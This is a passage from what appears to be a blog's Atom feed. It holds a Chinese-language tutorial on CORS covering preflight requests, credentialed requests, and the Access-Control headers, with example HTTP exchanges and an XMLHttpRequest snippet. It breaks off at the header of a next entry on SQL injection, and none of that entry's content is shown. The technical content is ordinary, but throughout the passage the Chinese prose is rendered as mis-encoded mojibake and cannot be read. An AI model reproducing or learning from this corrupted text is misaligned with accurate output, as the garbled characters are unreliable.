Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">[Some GZIP&#39;d payload]</span><br></pre></td></tr></table></figure><p>æµè§ˆå™¨æ£€æµ‹åˆ°ä»jsä¸­å‘èµ·çš„è¯·æ±‚éœ€è¦è¢«é¢„æ£€ï¼Œäºæ˜¯å…ˆå‘é€äº†ä¸€ä¸ªOPTIONSæ–¹æ³•çš„â€œé¢„æ£€è¯·æ±‚â€ã€‚</p><p>é¢„æ£€è¯·æ±‚ä¸­åŒæ—¶æºå¸¦äº†ä¸‹é¢ä¸¤ä¸ªé¦–éƒ¨å­—æ®µ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Request-Method: POST</span><br><span class="line">Access-Control-Request-Headers: X-PINGOTHER, Content-Type</span><br></pre></td></tr></table></figure><p>é¦–éƒ¨å­—æ®µ Access-Control-Request-Method å‘ŠçŸ¥æœåŠ¡å™¨ï¼Œå®é™…è¯·æ±‚å°†ä½¿ç”¨ POST æ–¹æ³•ã€‚é¦–éƒ¨å­—æ®µ Access-Control-Request-Headers å‘ŠçŸ¥æœåŠ¡å™¨ï¼Œå®é™…è¯·æ±‚å°†æºå¸¦ä¸¤ä¸ªè‡ªå®šä¹‰è¯·æ±‚é¦–éƒ¨å­—æ®µï¼šX-PINGOTHER ä¸ Content-Typeã€‚æœåŠ¡å™¨æ®æ­¤å†³å®šï¼Œè¯¥å®é™…è¯·æ±‚æ˜¯å¦è¢«å…è®¸ã€‚</p><p>ä¸‹é¢æ˜¯éœ€è¦æ³¨æ„çš„é‡ç‚¹å†…å®¹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Allow-Methods: POST, GET, OPTIONS</span><br><span class="line">Access-Control-Allow-Headers: X-PINGOTHER, Content-Type</span><br><span class="line">Access-Control-Max-Age: 86400</span><br></pre></td></tr></table></figure><p>é¦–éƒ¨å­—æ®µ <code>Access-Control-Allow-Methods</code> è¡¨æ˜æœåŠ¡å™¨å…è®¸å®¢æˆ·ç«¯ä½¿ç”¨ <code>POST,</code> <code>GET</code> å’Œ <code>OPTIONS</code> æ–¹æ³•å‘èµ·è¯·æ±‚ã€‚è¯¥å­—æ®µä¸ <a href="https://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.7">HTTP/1.1 Allow: response header</a> ç±»ä¼¼ï¼Œä½†ä»…é™äºåœ¨éœ€è¦è®¿é—®æ§åˆ¶çš„åœºæ™¯ä¸­ä½¿ç”¨ã€‚</p><p>é¦–éƒ¨å­—æ®µ <code>Access-Control-Allow-Headers</code> è¡¨æ˜æœåŠ¡å™¨å…è®¸è¯·æ±‚ä¸­æºå¸¦å­—æ®µ <code>X-PINGOTHER</code> ä¸ <code>Content-Type</code>ã€‚ä¸ <code>Access-Control-Allow-Methods</code> ä¸€æ ·ï¼Œ<code>Access-Control-Allow-Headers</code> çš„å€¼ä¸ºé€—å·åˆ†å‰²çš„åˆ—è¡¨ã€‚</p><p>æœ€åï¼Œé¦–éƒ¨å­—æ®µ <code>Access-Control-Max-Age</code> è¡¨æ˜è¯¥å“åº”çš„æœ‰æ•ˆæ—¶é—´ä¸º 86400 ç§’ï¼Œä¹Ÿå°±æ˜¯ 24 å°æ—¶ã€‚åœ¨æœ‰æ•ˆæ—¶é—´å†…ï¼Œæµè§ˆå™¨æ— é¡»ä¸ºåŒä¸€è¯·æ±‚å†æ¬¡å‘èµ·é¢„æ£€è¯·æ±‚ã€‚è¯·æ³¨æ„ï¼Œæµè§ˆå™¨è‡ªèº«ç»´æŠ¤äº†ä¸€ä¸ªæœ€å¤§æœ‰æ•ˆæ—¶é—´ï¼Œå¦‚æœè¯¥é¦–éƒ¨å­—æ®µçš„å€¼è¶…è¿‡äº†æœ€å¤§æœ‰æ•ˆæ—¶é—´ï¼Œå°†ä¸ä¼šç”Ÿæ•ˆã€‚</p><h3 id="é¢„æ£€è¯·æ±‚ä¸é‡å®šå‘"><a href="#é¢„æ£€è¯·æ±‚ä¸é‡å®šå‘" class="headerlink" title="é¢„æ£€è¯·æ±‚ä¸é‡å®šå‘"></a>é¢„æ£€è¯·æ±‚ä¸é‡å®šå‘</h3><p>å¤§å¤šæ•°æµè§ˆå™¨ä¸æ”¯æŒå¯¹äºé¢„æ£€è¯·æ±‚çš„é‡å®šå‘ï¼Œæµè§ˆå™¨å°†æŠ¥å‘Šé”™è¯¯</p><blockquote><p>The request was redirected to â€˜<a href="https://example.com/foo">https://example.com/foo</a>â€˜, which is disallowed for cross-origin requests that require preflight</p><p>Request requires preflight, which is disallowed to follow cross-origin redirect</p></blockquote><p>CORSæœ€åˆæ˜¯å…è®¸è¯¥è¡Œä¸ºçš„ï¼Œ<strong>ä¸è¿‡åœ¨åç»­çš„ä¿®è®¢ä¸­åºŸå¼ƒäº†è¿™ä¸€è¦æ±‚</strong></p><p>æœ‰ä¸¤ç§æ–¹æ³•å¯¹ä¸Šè¿°æŠ¥é”™è¡Œä¸ºè¿›è¡Œè§„é¿</p><ul><li>åœ¨æœåŠ¡ç«¯å»æ‰å¯¹é¢„æ£€è¯·æ±‚çš„é‡å®šå‘ï¼›</li><li>å°†å®é™…è¯·æ±‚å˜æˆä¸€ä¸ªç®€å•è¯·æ±‚ã€‚</li></ul><p>å¦‚æœä½¿ç”¨ä»¥ä¸Šä¸¤ç§æ–¹æ³•å­˜åœ¨å›°éš¾ï¼Œæˆ‘ä»¬ä»æœ‰å…¶ä»–æ–¹æ³•ï¼š</p><ul><li>å‘å‡ºä¸€ä¸ªç®€å•è¯·æ±‚ï¼ˆä½¿ç”¨ <a href="https://developer.mozilla.org/en-US/docs/Web/API/Response/url">Response.url</a> æˆ– <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseURL">XHR.responseURL</a>ï¼‰ä»¥åˆ¤æ–­çœŸæ­£çš„é¢„æ£€è¯·æ±‚ä¼šè¿”å›ä»€ä¹ˆåœ°å€ã€‚</li><li>å‘å‡ºå¦ä¸€ä¸ªè¯·æ±‚ï¼ˆçœŸæ­£çš„è¯·æ±‚ï¼‰ï¼Œä½¿ç”¨åœ¨ä¸Šä¸€æ­¥é€šè¿‡<a href="https://developer.mozilla.org/en-US/docs/Web/API/Response/url">Response.url</a> æˆ– <a href="https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/responseURL">XMLHttpRequest.responseURL</a>è·å¾—çš„URLã€‚</li></ul><p>æ³¨æ„ï¼šå¦‚æœè¯·æ±‚æ˜¯ç”±äºå­˜åœ¨ Authorization å­—æ®µè€Œå¼•å‘äº†é¢„æ£€è¯·æ±‚ï¼Œåˆ™è¿™ä¸€æ–¹æ³•å°†æ— æ³•ä½¿ç”¨ã€‚è¿™ç§æƒ…å†µåªèƒ½ç”±æœåŠ¡ç«¯è¿›è¡Œæ›´æ”¹ã€‚</p><h2 id="é™„å¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚"><a href="#é™„å¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚" class="headerlink" title="é™„å¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚"></a>é™„å¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚</h2><p><code>[XMLHttpRequest](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest)</code> æˆ– <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">Fetch</a> ä¸ CORS çš„ä¸€ä¸ªæœ‰è¶£çš„ç‰¹æ€§æ˜¯ï¼Œå¯ä»¥åŸºäº  <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">HTTP cookies</a> å’Œ HTTP è®¤è¯ä¿¡æ¯å‘é€èº«ä»½å‡­è¯ã€‚ä¸€èˆ¬è€Œè¨€ï¼Œå¯¹äºè·¨æº <code>[XMLHttpRequest](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest)</code> æˆ– <a href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API">Fetch</a> è¯·æ±‚ï¼Œæµè§ˆå™¨<strong>ä¸ä¼š</strong>å‘é€èº«ä»½å‡­è¯ä¿¡æ¯ã€‚å¦‚æœè¦å‘é€å‡­è¯ä¿¡æ¯ï¼Œéœ€è¦è®¾ç½® <code>[XMLHttpRequest](https://developer.mozilla.org/en-US/DOM/XMLHttpRequest)</code> çš„æŸä¸ªç‰¹æ®Šæ ‡å¿—ä½ã€‚</p><p>æœ¬ä¾‹ä¸­ï¼Œ<a href="http://foo.example">http://foo.example</a> çš„æŸè„šæœ¬å‘ <a href="http://bar.other">http://bar.other</a> å‘èµ·ä¸€ä¸ªGET è¯·æ±‚ï¼Œå¹¶è®¾ç½® Cookiesï¼š</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> invocation = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line"><span class="keyword">var</span> url = <span class="string">&#x27;http://bar.other/resources/credentialed-content/&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callOtherDomain</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(invocation) &#123;</span><br><span class="line">    invocation.open(<span class="string">&#x27;GET&#x27;</span>, url, <span class="literal">true</span>);</span><br><span class="line">    invocation.withCredentials = <span class="literal">true</span>;</span><br><span class="line">    invocation.onreadystatechange = handler;</span><br><span class="line">    invocation.send();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XMLHttpRequest çš„ withCredentials æ ‡å¿—è®¾ç½®ä¸º trueï¼Œä»è€Œå‘æœåŠ¡å™¨å‘é€ Cookiesã€‚å› ä¸ºè¿™æ˜¯ä¸€ä¸ªç®€å• GET è¯·æ±‚ï¼Œæ‰€ä»¥æµè§ˆå™¨ä¸ä¼šå¯¹å…¶å‘èµ·â€œé¢„æ£€è¯·æ±‚â€ã€‚ä½†æ˜¯ï¼Œå¦‚æœæœåŠ¡å™¨ç«¯çš„å“åº”ä¸­æœªæºå¸¦ Access-Control-Allow-Credentials: true ï¼Œæµè§ˆå™¨å°†ä¸ä¼šæŠŠå“åº”å†…å®¹è¿”å›ç»™è¯·æ±‚çš„å‘é€è€…ã€‚</p><p><img src="https://myimage-1303975616.cos.ap-guangzhou.myqcloud.com/img/2021tyandcors4.png" alt=""></p><p>è¯·æ±‚åŒ…å’Œå“åº”åŒ…å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;resources&#x2F;access-control-with-credentials&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: bar.other</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; U; Intel Mac OS X 10.5; en-US; rv:1.9.1b3pre) Gecko&#x2F;20081130 Minefield&#x2F;3.1b3pre</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: en-us,en;q&#x3D;0.5</span><br><span class="line">Accept-Encoding: gzip,deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http:&#x2F;&#x2F;foo.example&#x2F;examples&#x2F;credential.html</span><br><span class="line">Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Cookie: pageAccess&#x3D;2</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Date: Mon, 01 Dec 2008 01:34:52 GMT</span><br><span class="line">Server: Apache&#x2F;2</span><br><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;foo.example</span><br><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Set-Cookie: pageAccess&#x3D;3; expires&#x3D;Wed, 31-Dec-2008 01:34:53 GMT</span><br><span class="line">Vary: Accept-Encoding, Origin</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 106</span><br><span class="line">Keep-Alive: timeout&#x3D;2, max&#x3D;100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">[text&#x2F;plain payload]</span><br></pre></td></tr></table></figure><p>å³ä½¿æŒ‡å®šäº†Cookieçš„ç›¸å…³ä¿¡æ¯ï¼Œå¦‚æœbar.otherçš„å“åº”ä¸­ç¼ºå¤±Access-Control-Allow-Credentials: true,åˆ™å“åº”å†…å®¹ä¹Ÿä¸ä¼šè¿”å›ç»™å‘èµ·è¯·æ±‚è€…</p><h3 id="é™„å¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚ä¸é€šé…ç¬¦"><a href="#é™„å¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚ä¸é€šé…ç¬¦" class="headerlink" title="é™„å¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚ä¸é€šé…ç¬¦"></a>é™„å¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚ä¸é€šé…ç¬¦</h3><p>å¯¹äºé™„å¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨ä¸å¾—è®¾ç½® <code>Access-Control-Allow-Origin</code> çš„å€¼ä¸ºâ€œ<code>*</code>â€ã€‚</p><p>è¿™æ˜¯å› ä¸ºè¯·æ±‚çš„é¦–éƒ¨ä¸­æºå¸¦äº† <code>Cookie</code> ä¿¡æ¯ï¼Œå¦‚æœ <code>Access-Control-Allow-Origin</code> çš„å€¼ä¸ºâ€œ<code>*</code>â€ï¼Œè¯·æ±‚å°†ä¼šå¤±è´¥ã€‚è€Œå°† <code>Access-Control-Allow-Origin</code> çš„å€¼è®¾ç½®ä¸º <code>http://foo.example</code>ï¼Œåˆ™è¯·æ±‚å°†æˆåŠŸæ‰§è¡Œã€‚</p><p>å¦å¤–ï¼Œå“åº”é¦–éƒ¨ä¸­ä¹Ÿæºå¸¦äº† Set-Cookie å­—æ®µï¼Œå°è¯•å¯¹ Cookie è¿›è¡Œä¿®æ”¹ã€‚å¦‚æœæ“ä½œå¤±è´¥ï¼Œå°†ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</p><h3 id="ç¬¬ä¸‰æ–¹cookies"><a href="#ç¬¬ä¸‰æ–¹cookies" class="headerlink" title="ç¬¬ä¸‰æ–¹cookies"></a>ç¬¬ä¸‰æ–¹cookies</h3><p>æ³¨æ„åœ¨CORSå“åº”ä¸­è®¾ç½®çš„cookiesä½¿ç”¨ä¸€èˆ¬æ€§ç¬¬ä¸‰æ–¹cookieç­–ç•¥ã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œé¡µé¢æ˜¯åœ¨â€˜fooã€‚exampleâ€™åŠ è½½ï¼Œä½†æ˜¯ç¬¬20è¡Œçš„cookieæ˜¯è¢«â€˜bar.otherâ€™å‘é€çš„ï¼Œå¦‚æœç”¨æˆ·è®¾ç½®å…¶æµè§ˆå™¨æ‹’ç»æ‰€æœ‰ç¬¬ä¸‰æ–¹cookiesï¼Œé‚£ä¹ˆå°†ä¸ä¼šè¢«ä¿å­˜ã€‚</p><h2 id="HTTPå“åº”é¦–éƒ¨å­—æ®µ"><a href="#HTTPå“åº”é¦–éƒ¨å­—æ®µ" class="headerlink" title="HTTPå“åº”é¦–éƒ¨å­—æ®µ"></a>HTTPå“åº”é¦–éƒ¨å­—æ®µ</h2><h3 id="Access-Control-Allow-Origin"><a href="#Access-Control-Allow-Origin" class="headerlink" title="Access-Control-Allow-Origin"></a>Access-Control-Allow-Origin</h3><p>å“åº”é¦–éƒ¨ä¸­å¯ä»¥æºå¸¦ä¸€ä¸ªAccess-Control-Allow-Origin å­—æ®µï¼Œå…¶è¯­æ³•å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: &lt;origin&gt; | *</span><br></pre></td></tr></table></figure><p>å…¶ä¸­ï¼Œoriginå‚æ•°çš„å€¼æŒ‡å®šäº†å…è®¸è®¿é—®è¯¥èµ„æºçš„å¤–åŸŸURIã€‚å¯¹äºä¸éœ€è¦æºå¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚ï¼ŒæœåŠ¡å™¨å¯ä»¥æŒ‡å®šè¯¥å­—æ®µçš„å€¼ä¸ºé€šé…ç¬¦ï¼Œè¡¨ç¤ºå…è®¸æ¥è‡ªæ‰€æœ‰åŸŸçš„è¯·æ±‚ã€‚</p><p>ä¾‹å¦‚ï¼Œä¸‹é¢çš„å­—æ®µå€¼å°†å…è®¸æ¥è‡ª<a href="http://mozilla.com/">http://mozilla.com</a> çš„è¯·æ±‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Origin: http:&#x2F;&#x2F;mozilla.com</span><br></pre></td></tr></table></figure><p>å¦‚æœæœåŠ¡ç«¯æŒ‡å®šäº†å…·ä½“çš„åŸŸåè€Œéâ€œ*â€ï¼Œé‚£ä¹ˆå“åº”é¦–éƒ¨ä¸­çš„Varyå­—æ®µçš„å€¼å¿…é¡»åŒ…å«Originã€‚è¿™å°†å‘Šè¯‰å®¢æˆ·ç«¯ï¼šæœåŠ¡å™¨å¯¹ä¸åŒçš„æºç«™è¿”å›ä¸åŒçš„å†…å®¹ã€‚</p><h3 id="Access-Control-Expose-Headers"><a href="#Access-Control-Expose-Headers" class="headerlink" title="Access-Control-Expose-Headers"></a><strong>Access-Control-Expose-Headers</strong></h3><p>åœ¨è·¨æºè®¿é—®æ—¶ï¼ŒXMLHttpRequestå¯¹è±¡çš„getResponseHeader()æ–¹æ³•åªèƒ½æ‹¿åˆ°ä¸€äº›æœ€åŸºæœ¬çš„å“åº”å¤´ï¼ŒCache-Controlã€Content-Languageã€Content-Typeã€Expiresã€Last-Modifiedã€Pragmaï¼Œå¦‚æœè¦è®¿é—®å…¶ä»–å¤´ï¼Œåˆ™éœ€è¦æœåŠ¡å™¨è®¾ç½®æœ¬å“åº”å¤´ã€‚</p><p><code>[Access-Control-Expose-Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Expose-Headers)</code> å¤´è®©æœåŠ¡å™¨æŠŠå…è®¸æµè§ˆå™¨è®¿é—®çš„å¤´æ”¾å…¥ç™½åå•ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Expose-Headers: X-My-Custom-Header, X-Another-Custom-Header</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™æ ·æµè§ˆå™¨å°±èƒ½å¤Ÿé€šè¿‡getResponseHeaderè®¿é—®<code>X-My-Custom-Header</code>å’Œ <code>X-Another-Custom-Header</code> å“åº”å¤´äº†ã€‚</p><h3 id="Access-Control-Max-Age"><a href="#Access-Control-Max-Age" class="headerlink" title="Access-Control-Max-Age"></a>Access-Control-Max-Age</h3><p><code>[Access-Control-Max-Age](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Max-Age)</code> å¤´æŒ‡å®šäº†preflightè¯·æ±‚çš„ç»“æœèƒ½å¤Ÿè¢«ç¼“å­˜å¤šä¹…ï¼Œè¯·å‚è€ƒæœ¬æ–‡åœ¨å‰é¢æåˆ°çš„preflightä¾‹å­ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Max-Age: &lt;delta-seconds&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>delta-seconds</code> å‚æ•°è¡¨ç¤ºpreflightè¯·æ±‚çš„ç»“æœåœ¨å¤šå°‘ç§’å†…æœ‰æ•ˆã€‚</p><h3 id="Access-Control-Allow-Credentials"><a href="#Access-Control-Allow-Credentials" class="headerlink" title="Access-Control-Allow-Credentials"></a>Access-Control-Allow-Credentials</h3><p><code>[Access-Control-Allow-Credentials](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials)</code> å¤´æŒ‡å®šäº†å½“æµè§ˆå™¨çš„<code>credentials</code>è®¾ç½®ä¸ºtrueæ—¶æ˜¯å¦å…è®¸æµè§ˆå™¨è¯»å–responseçš„å†…å®¹ã€‚å½“ç”¨åœ¨å¯¹preflighté¢„æ£€æµ‹è¯·æ±‚çš„å“åº”ä¸­æ—¶ï¼Œå®ƒæŒ‡å®šäº†å®é™…çš„è¯·æ±‚æ˜¯å¦å¯ä»¥ä½¿ç”¨<code>credentials</code>ã€‚è¯·æ³¨æ„ï¼šç®€å• GET è¯·æ±‚ä¸ä¼šè¢«é¢„æ£€ï¼›å¦‚æœå¯¹æ­¤ç±»è¯·æ±‚çš„å“åº”ä¸­ä¸åŒ…å«è¯¥å­—æ®µï¼Œè¿™ä¸ªå“åº”å°†è¢«å¿½ç•¥æ‰ï¼Œå¹¶ä¸”æµè§ˆå™¨ä¹Ÿä¸ä¼šå°†ç›¸åº”å†…å®¹è¿”å›ç»™ç½‘é¡µã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Credentials: true</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¸Šæ–‡å·²ç»è®¨è®ºäº†<a href="https://developer.mozilla.org/zh-CN/docs/web/http/CORS#requests_with_credentials">é™„å¸¦èº«ä»½å‡­è¯çš„è¯·æ±‚</a>ã€‚</p><h3 id="Access-Control-Allow-Methods"><a href="#Access-Control-Allow-Methods" class="headerlink" title="Access-Control-Allow-Methods"></a>Access-Control-Allow-Methods</h3><p><code>[Access-Control-Allow-Methods](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Methods)</code> é¦–éƒ¨å­—æ®µç”¨äºé¢„æ£€è¯·æ±‚çš„å“åº”ã€‚å…¶æŒ‡æ˜äº†å®é™…è¯·æ±‚æ‰€å…è®¸ä½¿ç”¨çš„ HTTP æ–¹æ³•ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Methods: &lt;method&gt;[, &lt;method&gt;]*</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›¸å…³ç¤ºä¾‹è§<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS$edit#Preflighted_requests">è¿™é‡Œ</a>ã€‚</p><h3 id="Access-Control-Allow-Headers"><a href="#Access-Control-Allow-Headers" class="headerlink" title="Access-Control-Allow-Headers"></a>Access-Control-Allow-Headers</h3><p><code>[Access-Control-Allow-Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Allow-Headers)</code> é¦–éƒ¨å­—æ®µç”¨äºé¢„æ£€è¯·æ±‚çš„å“åº”ã€‚å…¶æŒ‡æ˜äº†å®é™…è¯·æ±‚ä¸­å…è®¸æºå¸¦çš„é¦–éƒ¨å­—æ®µã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Allow-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</span><br></pre></td></tr></table></figure><h2 id="HTTPè¯·æ±‚é¦–éƒ¨å­—æ®µ"><a href="#HTTPè¯·æ±‚é¦–éƒ¨å­—æ®µ" class="headerlink" title="HTTPè¯·æ±‚é¦–éƒ¨å­—æ®µ"></a>HTTPè¯·æ±‚é¦–éƒ¨å­—æ®µ</h2><p>è¿™äº›é¦–éƒ¨å­—æ®µæ— é¡»æ‰‹åŠ¨è®¾ç½®ï¼Œå½“ä½¿ç”¨XMLHttpRequestå¯¹è±¡å‘èµ·è·¨æºè¯·æ±‚æ—¶ï¼Œå®ƒä»¬å·²ç»è¢«è®¾ç½®å°±ç»ªã€‚</p><h3 id="Origin"><a href="#Origin" class="headerlink" title="Origin"></a>Origin</h3><p>Originé¦–éƒ¨å­—æ®µè¡¨æ˜é¢„æ£€è¯·æ±‚æˆ–å®é™…è¯·æ±‚çš„æºç«™ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Origin:&lt;origin&gt;</span><br></pre></td></tr></table></figure><p>originçš„å‚æ•°å€¼ä¸ºæºç«™çš„URIï¼Œå®ƒä¸ç”¨åŒ…å«ä»»æ„è·¯å¾„ä¿¡æ¯ï¼Œå®ƒåªæ˜¯æœåŠ¡å™¨åç§°ã€‚</p><p><strong>æ³¨æ„ï¼š</strong>æœ‰æ—¶å€™å°†è¯¥å­—æ®µçš„å€¼è®¾ç½®ä¸ºç©ºå­—ç¬¦æ˜¯ä¸€æ ·æœ‰ç”¨å¯ä»¥ç”Ÿæ•ˆçš„ï¼Œä¾‹å¦‚å½“æºç«™æ˜¯ä¸€ä¸ªdata URLæ—¶</p><p><strong>æ³¨æ„ï¼š</strong>åœ¨æ‰€æœ‰è®¿é—®æ§åˆ¶è¯·æ±‚ä¸­ï¼ŒOriginé¦–éƒ¨å­—æ®µæ€»æ˜¯è¢«å‘é€ã€‚</p><h3 id="Access-Control-Request-Method"><a href="#Access-Control-Request-Method" class="headerlink" title="Access-Control-Request-Method"></a>Access-Control-Request-Method</h3><p><code>[Access-Control-Request-Method](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Method)</code> é¦–éƒ¨å­—æ®µç”¨äºé¢„æ£€è¯·æ±‚ã€‚å…¶ä½œç”¨æ˜¯ï¼Œå°†å®é™…è¯·æ±‚æ‰€ä½¿ç”¨çš„ HTTP æ–¹æ³•å‘Šè¯‰æœåŠ¡å™¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Request-Method: &lt;method&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç›¸å…³ç¤ºä¾‹è§<a href="https://developer.mozilla.org/zh-CN/docs/web/http/CORS#preflighted_requests">è¿™é‡Œ</a>ã€‚</p><h3 id="Access-Control-Request-Headers"><a href="#Access-Control-Request-Headers" class="headerlink" title="Access-Control-Request-Headers"></a>Access-Control-Request-Headers</h3><p><code>[Access-Control-Request-Headers](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Access-Control-Request-Headers)</code> é¦–éƒ¨å­—æ®µç”¨äºé¢„æ£€è¯·æ±‚ã€‚å…¶ä½œç”¨æ˜¯ï¼Œå°†å®é™…è¯·æ±‚æ‰€æºå¸¦çš„é¦–éƒ¨å­—æ®µå‘Šè¯‰æœåŠ¡å™¨ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Access-Control-Request-Headers: &lt;field-name&gt;[, &lt;field-name&gt;]*</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;åŒæºç­–ç•¥å’ŒCORS&quot;&gt;&lt;a href=&quot;#åŒæºç­–ç•¥å’ŒCORS&quot; class=&quot;headerlink&quot; title=&quot;åŒæºç­–ç•¥å’ŒCORS&quot;&gt;&lt;/a&gt;åŒæºç­–ç•¥å’ŒCORS&lt;/h1&gt;&lt;h1 id=&quot;åŒæºç­–ç•¥&quot;&gt;&lt;a href=&quot;#åŒæºç­–ç•¥&quot; class=&quot;headerli</summary>
      
    
    
    
    <category term="web" scheme="http://www.fxizenta.design/categories/web/"/>
    
    <category term="åŸŸçš„é—®é¢˜" scheme="http://www.fxizenta.design/categories/web/%E5%9F%9F%E7%9A%84%E9%97%AE%E9%A2%98/"/>
    
    
    <category term="å‰ç«¯" scheme="http://www.fxizenta.design/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>sqlæ³¨å…¥æ€»ç»“(è¡¥å……æ›´æ–°ä¸­)</title>
    <link href="http://www.fxizenta.design/2021/04/17/sqli/"/>
    <id>http://www.fxizenta.design/2021/04/17/sqli/</id>
    <published>2021-04-17T08:52:02.149Z</published>
    <updated>2021-07-27T13:10:06.138Z</updated>
    
